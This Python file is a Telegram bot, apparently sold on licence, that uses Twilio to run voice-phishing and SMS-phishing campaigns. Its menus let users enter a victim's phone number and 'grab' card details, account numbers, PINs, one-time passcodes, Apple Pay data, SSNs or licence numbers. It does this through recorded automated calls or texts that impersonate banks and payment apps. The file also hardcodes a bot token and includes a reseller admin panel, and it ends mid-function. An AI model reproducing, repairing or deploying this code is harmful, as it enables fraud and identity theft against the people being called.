import flask
from datetime import *
from flask import Flask, session
import requests
import time
#from flask_session import Session
import phonenumbers
import telebot
import twilio
from phonenumbers import NumberParseException
from twilio.twiml.voice_response import VoiceResponse, Gather
from twilio.twiml.messaging_response import MessagingResponse
from flask import Flask, request
from telebot import types
from twilio.rest import Client
import sqlite3
from dbase import *
from cred import *

path = 'UserDetails.db'
conn = sqlite3.connect(path, check_same_thread=False)

c = conn.cursor()

# Twilio connection
client = Client(account_sid, auth_token)

# Flask connection
app = Flask(__name__)

# Bot connection
bot = telebot.TeleBot("5669710982:AAHSfr1aUNKPhUAuFy9i8ugYjGwNxSx2Wvs",
                      threaded=False)
bot.remove_webhook()
bot.set_webhook(url=callurl)

option_select = [
  'Grab Card Details 💳', 'Grab Account # 🏦', 'Grab PIN 📌', 'Grab OTP 🤖',
  'Grab Apple Pay 🍎', 'Grab SSN 👤', 'Grab DL # 🚘'
]

option_call = ''
custom_lang = ''
service_app = ''
lan_sel = ''
custom_sel = ''


# Process webhook calls
@app.route('/', methods=['GET', 'POST'])
def webhook():
  if flask.request.headers.get('content-type') == 'application/json':
    json_string = flask.request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return ''
  else:
    print("error")
    flask.abort(403)


# Handle '/start'
@bot.message_handler(commands=['start'])
def send_welcome(message):
  id = message.from_user.id
  print("user id bot", id)
  print(check_user(id))
  print(check_admin(id))
  print(fetch_expiry_date(id))
  if check_admin(id) == True:
    if check_user(id) != True:
      create_user_lifetime(id)
    else:
      pass
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,
                                         resize_keyboard=True)
    keyboard.row_width = 2
    item1 = types.KeyboardButton(text="User Mode")
    item2 = types.KeyboardButton(text="Admin Mode")
    keyboard.add(item1)
    keyboard.add(item2)
    send = bot.send_message(
      message.chat.id,
      "Welcome! 🥳\n\nWould you like to be in user or admin mode?",
      reply_markup=keyboard)
  elif (check_user(id) == True) and check_expiry_days(id) > 0:
    days_left = check_expiry_days(id)
    name = message.from_user.first_name
    send = bot.send_message(message.chat.id,
                            f"Hey {name} .\nYou have {days_left} days left ")
    send = bot.send_message(
      message.chat.id,
      "Reply With Victim's Phone Number 📱:\n\ne.g +14358762364\n\nMake sure to use the + or the bot will not work correctly!"
    )
    bot.register_next_step_handler(send, saving_phonenumber)
  else:
    send = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def saving_phonenumber(message):
  userid = message.from_user.id
  no_tobesaved = str(message.text)
  z = phonenumbers.parse(no_tobesaved, "US")
  try:
    if phonenumbers.is_valid_number(
        z) == True and phonenumbers.is_valid_number(z) == True:
      save_phonenumber(no_tobesaved, userid)
      send = bot.send_message(
        message.chat.id,
        "Success! 🧩 Number is valid.\n\n*Type “Ok” to continue*",
        parse_mode='Markdown')
      bot.register_next_step_handler(send, call_or_sms_or_script)
    else:
      bot.send_message(
        message.chat.id,
        " THE NUMBER YOU HAVE ENTERED IS INVALID ENTER CORRECT NUMBER ✅❌\nUse /start command."
      )
  except phonenumbers.NumberParseException:
    bot.send_message(message.chat.id, "Invalid Number ❌\nUse /start command")


#def pick_user_or_admin(message):
#    if message.text == 'User Mode':
#
#    elif message.text == 'Admin Mode':
#        send = bot.send_message(message.chat.id, "Hey Admin 👑\n*Type “Ok” to continue*", parse_mode='Markdown')
#        bot.register_next_step_handler(send, adminfunction)
#    else:
#        send = bot.send_message(message.chat.id,
#                                "Invalid Option ❌\nUse /start command")


def call_or_sms_or_script(message):
  userid = message.from_user.id
  name = message.from_user.first_name
  keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,
                                       resize_keyboard=True)
  keyboard.row_width = 2
  item1 = types.KeyboardButton(text="Call Mode")
  item3 = types.KeyboardButton(text="SMS Mode")
  item4 = types.KeyboardButton(text="Custom Script")
  keyboard.add(item1)
  keyboard.add(item3)
  keyboard.add(item4)
  bot.send_message(message.chat.id,
                   f"WHAT MODE DO YOU WANT? , {name} 🥇",
                   reply_markup=keyboard)


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Call Mode")
def call_mode(message):
  if (check_user(message.chat.id) == True):
    send = bot.send_message(
      message.chat.id,
      "Welcome to Call Mode 📞\n\n*Type “Ok” to continue*",
      parse_mode='Markdown')
    bot.register_next_step_handler(send, card_or_Otp)
  else:
    send3 = bot.send_message(message.chat.id,
                             "❌ Your not an Authorized to use this Service ❌")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "SMS Mode")
def sms_mode(message):
  if (check_user(message.chat.id) == True):
    send = bot.send_message(
      message.chat.id,
      "Ok, \n\n*Reply with a service name 🏦*\n\n(e.g. Cash App):",
      parse_mode='Markdown')
    bot.register_next_step_handler(send, sms_mode2)
  else:
    send3 = bot.send_message(message.chat.id,
                             "❌ Your not an Authorized to use this Service ❌")


def sms_mode2(message):
  bankname = message.text
  userid = message.from_user.id
  save_bankName(bankname, userid)
  send = bot.send_message(message.chat.id,
                          "Success! Say 'text' to send message now")
  bot.register_next_step_handler(send, send_text)


def send_text(message):
  # global userid
  # global chat_id
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  ph_no = fetch_phonenumber(userid)
  bankname = fetch_bankname(userid)
  print(ph_no)
  try:
    sms_message = client.messages.create(
      body=
      f'This is an automated message from {bankname}.\n\nThere has been a suspicious attempt to login to your account, and we need to verify your identity by confirming the phone number on file.\n\nTo block this attempt please reply with the One Time Passcode you just received. \n\nMsg&Data rates may apply.',
      from_=twiliosmsnumber,
      status_callback=callurl + '/statuscallback2/' + userid,
      to=ph_no)
  except:
    bot.send_message(chat_id,
                     "An error has occured , contact admin @MADARA888UCHIHA")

  else:
    print('Message sent sucessfully!')
    bot.send_message(chat_id, "Text is getting sent 🗯..")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Custom Script")
def langua_choose(message):
  if (check_user(message.chat.id) == True):
    global custom_sel
    custom_sel = message.text
    print(custom_sel)
    sendl = bot.send_message(
      message.chat.id,
      "*Choose Language for Cutom Script\n 'Enter script of selected language or u will be Banned\nTye ok to continue'*"
    )
    bot.register_next_step_handler(sendl, langua)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def langua_decide(lan):
  if (lan == "Hindi (en-IN)"):
    global lan_sel
    lan_sel = 'en-IN'
  elif lan == "Spanish (es-ES)":
    # global lan_sel
    lan_sel = 'es-ES'
  else:
    # global lan_sel
    lan_sel = 'en-US'


@bot.message_handler(
  content_types=["text"],
  func=lambda message:
  (message.text == "English (en-US)" and custom_sel == "Custom Script") or
  (message.text == "Hindi (en-IN)" and custom_sel == "Custom Script") or
  (message.text == "Spanish (es-ES)" and custom_sel == "Custom Script"))
def custom_script(message):
  if (check_user(message.chat.id) == True):
    global custom_lang
    custom_lang = message.text
    print("llll", custom_lang)
    langua_decide(custom_lang)
    # global lan_sel
    print(lan_sel)
    send = bot.send_message(
      message.chat.id,
      'When writing script, ensure you end script with a press one followed by pound key line\ne.g "Press 1 followed by pound key to secure account" '
    )
    send1 = bot.send_message(message.chat.id,
                             "*Sample Script*",
                             parse_mode='Markdown')
    send2 = bot.send_message(
      message.chat.id,
      "Hello this is an automated call from Smiths Bank, we have detected an unauthorized access request to your account, Press 1 followed by pound key to secure account"
    )
    send3 = bot.send_message(
      message.chat.id,
      "*use commas where fullstops should be and use commas where commas should be also*",
      parse_mode='Markdown')
    # sendl = bot.send_message(message.chat.id,"*Choose Language for Cutom Script\n 'Enter script of selected or u will be Banned\n'*")
    # bot.register_next_step_handler(sendl, langua)
    # global service_app
    # service_app = message.text
    send3 = bot.send_message(message.chat.id, "Please enter script: ")
    bot.register_next_step_handler(send, savings_script)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def savings_script(message):
  script_tobesaved = message.text
  userid = message.from_user.id
  save_script(script_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    "Your script has been saved for one time use.\n\nReply with 'ok' ")
  bot.register_next_step_handler(send, enter_options)


def enter_options(message):
  keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,
                                       resize_keyboard=True)
  keyboard.row_width = 2
  item1 = types.KeyboardButton(text="1")
  item2 = types.KeyboardButton(text="2")
  keyboard.add(item1, item2)
  send = bot.reply_to(message,
                      " Enter number of input options for victim: ",
                      reply_markup=keyboard)
  bot.register_next_step_handler(send, saving_options0)


def saving_options0(message):
  userid = message.from_user.id
  option_number = message.text
  save_option_number(option_number, userid)
  if option_number == "1":
    send0 = bot.send_message(
      message.chat.id,
      'Be sure to end text with \n"followed by pound key" \n\n(e.g "Please enter your 9 digit SSN followed by pound key" )'
    )
    send = bot.send_message(message.chat.id, "Please enter input option:")
    bot.register_next_step_handler(send, saving_options1)

  elif option_number == "2":
    send = bot.send_message(
      message.chat.id,
      'Be sure to end text with \n"followed by pound key" \n\n(e.g "Please enter your 9 digit SSN followed by pound key" )'
    )
    send = bot.send_message(message.chat.id,
                            "Please enter your first input option:")
    bot.register_next_step_handler(send, saving_options2)

  else:
    send = bot.send_message(
      message.chat.id,
      "You have selected an invalid option\n\nPlease use the /start command again"
    )


def saving_options1(message):
  userid = message.from_user.id
  try:
    option1 = message.text
    save_option1(option1, userid)
  except TypeError:
    bot.send_message(
      message.chat.id,
      "Your input option should be text!\n\nUse /Help command for more info\nUse /start command to start continue "
    )
  else:
    send = bot.send_message(message.chat.id, "Success! Say 'call' to call now")
    bot.register_next_step_handler(send, making_call_custom)


def saving_options2(message):
  userid = message.from_user.id
  try:
    option1 = message.text
    save_option1(option1, userid)
  except TypeError:
    bot.send_message(
      message.chat.id,
      "Your input option should be text!\n\nUse /Help command for more info\nUse /start command to continue "
    )
  else:
    send = bot.send_message(message.chat.id,
                            "Please enter your second input option: ")
    bot.register_next_step_handler(send, saving_options3)


def saving_options3(message):
  userid = message.from_user.id
  try:
    option2 = message.text
    save_option2(option2, userid)
  except TypeError:
    bot.send_message(
      message.chat.id,
      "Your input option should be text!\n\nUse /Help command for more info\nUse /start command to continue "
    )
  else:
    send = bot.send_message(message.chat.id, 'Success! Say "call" to call now')
    bot.register_next_step_handler(send, making_call_custom)


def making_call_custom(message):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  ph_no = fetch_phonenumber(userid)
  print(ph_no)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/custom/' + userid),
    to=ph_no,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎...")


def card_or_Otp(message):
  userid = message.from_user.id
  name = message.from_user.first_name
  keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,
                                       resize_keyboard=True)
  keyboard.row_width = 2
  item1 = types.KeyboardButton(text="Grab Card Details 💳")
  item2 = types.KeyboardButton(text="Grab Account # 🏦")
  item3 = types.KeyboardButton(text="Grab PIN 📌")
  item4 = types.KeyboardButton(text="Grab OTP 🤖")
  item5 = types.KeyboardButton(text="Grab Apple Pay 🍎")
  item6 = types.KeyboardButton(text="Grab SSN 👤")
  item7 = types.KeyboardButton(text="Grab DL # 🚘")
  keyboard.add(item1)
  keyboard.add(item2, item7)
  keyboard.add(item3, item4)
  keyboard.add(item5, item6)
  bot.send_message(message.chat.id,
                   f"Please choose an option, {name}. 👑",
                   reply_markup=keyboard)


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Grab Apple Pay 🍎")
def grab_apple_pay(message):
  if (check_user(message.chat.id) == True):
    global option_call
    option_call = message.text
    print("workkkkk", option_call)
    send = bot.send_message(
      message.chat.id,
      "Ok, \n\n*Reply with a service name 🏦*\n\n(e.g. Cash App):",
      parse_mode='Markdown')
    bot.register_next_step_handler(send, langua)
    # userid = message.from_user.id
    # send = bot.send_message(message.chat.id,
    #                         "Ok, \n\n*Reply with a service name 🏦*\n\n(e.g. Cash App):", parse_mode='Markdown')
    # bot.register_next_step_handler(send, langua)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


# def abc(message):
#     print("rrrrr",option_call)
#     bot.send_message(message.chat.id,option_call)


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "E (en-US)" and
                     option_call == "Grab Apple Pay 🍎")
def grab_apple_pay1_en(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_actn_en)


def make_call_apple_en(message):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/appl_pyen/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='DetectMessageEnd')
  print(call.sid)
  bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Hindi (en-IN)" and
                     option_call == "Grab Apple Pay 🍎")
def grab_apple_pay1_hi(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_actn_hi)


def make_call_apple_hi(message):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/appl_pyhi/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='DetectMessageEnd')
  print(call.sid)
  bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Spanish (es-ES)" and
                     option_call == "Grab Apple Pay 🍎")
def grab_apple_pay1_sp(message):
  userid = message.from_user.id
  name_tobesaved = str(service_app)
  print(name_tobesaved)
  save_bankName(name_tobesaved, userid)
  send = bot.send_message(
    message.chat.id,
    'Success! 🥳 Send the code, and reply “Call” to begin the call.')
  bot.register_next_step_handler(send, make_call_actn_sp)


def make_call_apple_sp(message):
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/appl_pysp/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='DetectMessageEnd')
  print(call.sid)
  bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Grab SSN 👤")
def grab_ssn(message):
  if (check_user(message.chat.id) == True):
    global option_call
    option_call = message.text
    send = bot.send_message(message.chat.id,
                            'Ok! Reply “Call” to begin the call 👤')
    bot.register_next_step_handler(send, langua)
  else:
    send3 = bot.send_message(message.chat.id,
                             "❌ Your not an Authorized to use this Service ❌")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Spanish (es-ES)" and
                     option_call == "Grab SSN 👤")
def make_call_ssn_sp(message):
  # global userid
  # global chat_id
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/ssn_mdsp/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "English (en-US)" and
                     option_call == "Grab SSN 👤")
def make_call_ssn_en(message):
  # global userid
  # global chat_id
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/ssn_mden/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Hindi (en-IN)" and
                     option_call == "Grab SSN 👤")
def make_call_ssn_hi(message):
  # global userid
  # global chat_id
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/ssn_mdhi/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Grab DL # 🚘")
def grab_dl_number(message):
  if (check_user(message.chat.id) == True):
    global option_call
    option_call = message.text
    send = bot.send_message(message.chat.id,
                            'Ok! Reply “Call” to begin the call 💵')
    bot.register_next_step_handler(send, langua)
  else:
    send3 = bot.send_message(message.chat.id,
                             "❌ Your not an Authorized to use this Service ❌")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Spanish (es-ES)" and
                     option_call == "Grab DL # 🚘")
def make_call_dl_sp(message):
  # global userid
  # global chat_id
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/dl_mdsp/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "English (en-US)" and
                     option_call == "Grab DL # 🚘")
def make_call_dl_en(message):
  # global userid
  # global chat_id
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/dl_mden/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Hindi (en-IN)" and
                     option_call == "Grab DL # 🚘")
def make_call_dl_hi(message):
  # global userid
  # global chat_id
  userid = str(message.from_user.id)
  chat_id = message.chat.id
  phonenumber = fetch_phonenumber(userid)
  print(phonenumber)

  call = client.calls.create(
    record=True,
    status_callback=(callurl + '/statuscallback/' + userid),
    recording_status_callback=(callurl + '/details_rec/' + userid),
    status_callback_event=['ringing', 'answered', 'completed'],
    url=(callurl + '/dl_mdhi/' + userid),
    to=phonenumber,
    from_=twilionumber,
    machine_detection='Enable')
  print(call.sid)
  send = bot.send_message(message.chat.id, "Calling ☎️...")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "User Mode")
def usecase1(message):
  if (check_user(message.chat.id) == True
      or check_admin(message.chat.id) == True):
    name = message.from_user.first_name
    send0 = bot.send_message(message.chat.id,
                             f"Hey {name} 👑",
                             parse_mode='Markdown')
    send = bot.send_message(
      message.chat.id,
      "*Reply with the number 📱*\n\n(e.g +14358762364)\n\n*You Have to Use The +!*",
      parse_mode='Markdown')
    bot.register_next_step_handler(send0, saving_phonenumber)
  else:
    send = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Admin Mode")
def usecase2(message):
  if (check_admin(message.chat.id) == True):
    print("usecase2Id", message.chat.id)
    send1 = bot.send_message(message.chat.id,
                             "Hey Admin 👑\n*Type “Ok” to continue*",
                             parse_mode='Markdown')
    bot.register_next_step_handler(send1, adminfunction)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "❌ YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def adminfunction(message):
  userid = message.from_user.id
  name = message.from_user.first_name
  keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
  keyboard.row_width = 1
  item = types.KeyboardButton(text="Edit access")
  keyboard.add(item)
  bot.send_message(message.chat.id,
                   f"Please choose an option, {name}. 👑",
                   reply_markup=keyboard)


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Edit access")
def edit_access(message):
  if (check_admin(message.chat.id) == True):
    userid = message.from_user.id
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,
                                         resize_keyboard=True)
    keyboard.row_width = 4
    item1 = types.KeyboardButton(text="1 : Add Admin")
    item2 = types.KeyboardButton(text="2 : Add User")
    item3 = types.KeyboardButton(text="3 : Delete Admin")
    item4 = types.KeyboardButton(text="4 : Delete User")
    keyboard.add(item1, item2)
    keyboard.add(item3, item4)
    bot.send_message(message.chat.id,
                     "Ok , what next ?",
                     reply_markup=keyboard)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "1 : Add Admin")
def add_admin(message):
  if (check_admin(message.chat.id) == True):
    send = bot.send_message(message.chat.id, "Enter UserID: ")
    bot.register_next_step_handler(send, save_id_admin)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def save_id_admin(message):
  adminid = message.text
  create_admin(adminid)
  create_user_lifetime(adminid)
  bot.send_message(message.chat.id, f"Added Admin \n\n"
                   "Use /start for other functionality\n")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "2 : Add User")
def type_of_user(message):
  if (check_admin(message.chat.id) == True):
    userid = message.from_user.id
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True,
                                         resize_keyboard=True)
    keyboard.row_width = 4
    item1 = types.KeyboardButton(text="Test")
    item2 = types.KeyboardButton(text="7 days")
    item3 = types.KeyboardButton(text="1 month")
    item4 = types.KeyboardButton(text="3 months")
    item5 = types.KeyboardButton(text="Lifetime")
    keyboard.add(item1)
    keyboard.add(item2)
    keyboard.add(item3)
    keyboard.add(item4)
    keyboard.add(item5)
    bot.send_message(message.chat.id,
                     "Ok , what next ?",
                     reply_markup=keyboard)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Test")
def add_user(message):
  if (check_admin(message.chat.id) == True):
    send = bot.send_message(message.chat.id, "Enter UserID: ")
    bot.register_next_step_handler(send, createtest_user)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def createtest_user(message):
  try:
    name = message.from_user.first_name
    userid = message.text
    create_user_test(userid)
    bot.send_message(
      message.chat.id, f"Added user for Test calls \n\n"
      "Use /start for other functionality\n"
      "Good bye")
  except:
    bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")

    return ''


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "7 days")
def add_user(message):
  if (check_admin(message.chat.id) == True):
    send = bot.send_message(message.chat.id, "Enter UserID: ")
    bot.register_next_step_handler(send, create7days_user)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def create7days_user(message):
  try:
    name = message.from_user.first_name
    userid = message.text
    create_user_7days(userid)
    bot.send_message(
      message.chat.id, f"Added user for 7 days \n\n"
      "Use /start for other functionality\n")
  except:
    bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")
    return ''


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "1 month")
def add_user(message):
  if (check_admin(message.chat.id) == True):
    send = bot.send_message(message.chat.id, "Enter UserID: ")
    bot.register_next_step_handler(send, create1month_user)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def create1month_user(message):
  try:
    name = message.from_user.first_name
    userid = message.text
    create_user_1month(userid)
    bot.send_message(
      message.chat.id, f"Added user for 1 month \n\n"
      "Use /start for other functionality\n")
  except:
    bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")
    return ''


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "3 months")
def add_user(message):
  if (check_admin(message.chat.id) == True):
    send = bot.send_message(message.chat.id, "Enter UserID: ")
    bot.register_next_step_handler(send, create3months_user)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def create3months_user(message):
  try:
    name = message.from_user.first_name
    userid = message.text
    create_user_3months(userid)
    bot.send_message(
      message.chat.id, f"Added user for 3 months \n\n"
      "Use /start for other functionality\n")
  except:
    bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")
    return ''


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Lifetime")
def add_user(message):
  if (check_admin(message.chat.id) == True):
    send = bot.send_message(message.chat.id, "Enter UserID: ")
    bot.register_next_step_handler(send, create_user_lifetime)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def create_lifetime_user(message):
  try:
    name = message.from_user.first_name
    userid = message.text
    create_user_lifetime(userid)
    bot.send_message(
      message.chat.id, f"Added user for Life \n\n"
      "Use /start for other functionality\n")
  except:
    bot.send_message(message.chat.id, "Invalid Option ❌\nUse /start command")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "3 : Delete Admin")
def delete_admin(message):
  if (check_admin(message.chat.id) == True):
    send = bot.send_message(message.chat.id, "Enter userid: ")
    bot.register_next_step_handler(send, delete_id_admin)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def delete_id_admin(message):
  userid = message.text
  delete_specific_AdminData(userid)
  delete_specific_UserData(userid)
  bot.send_message(message.chat.id, f"Deleted Admin\n\n"
                   "Use /start for other functionality")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "4 : Delete User")
def delete_user(message):
  if (check_admin(message.chat.id) == True):
    send = bot.send_message(message.chat.id, "Enter userid: ")
    bot.register_next_step_handler(send, delete_id_user)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def delete_id_user(message):
  userid = message.text
  delete_specific_UserData(userid)
  bot.send_message(message.chat.id, f"Deleted user\n\n"
                   "Use /start for other functionality")


@bot.message_handler(content_types=["text"],
                     func=lambda message: message.text == "Grab Card Details 💳"
                     )
def presses_1(message):
  if (check_user(message.chat.id) == True):
    global option_call
    option_call = message.text
    userid = message.from_user.id
    send = bot.send_message(
      message.chat.id,
      "Ok, \n\n*Reply with a service name 🏦*\n\n(e.g. Cash App):",
      parse_mode='Markdown')
    bot.register_next_step_handler(send, langua)
  else:
    send3 = bot.send_message(
      message.chat.id,
      "YOU DO NOT HAVE A LICENSE TO USE THIS BOT🎯❌\n\nFOR PURCHASE CONTACT 📞 @MADARA888UCHIHA"
    )


def langua(message):
  global service_app
  service_app = message.text
  print(service_app)
  userid = message.from_user.id
  name = message.from_user.first_name
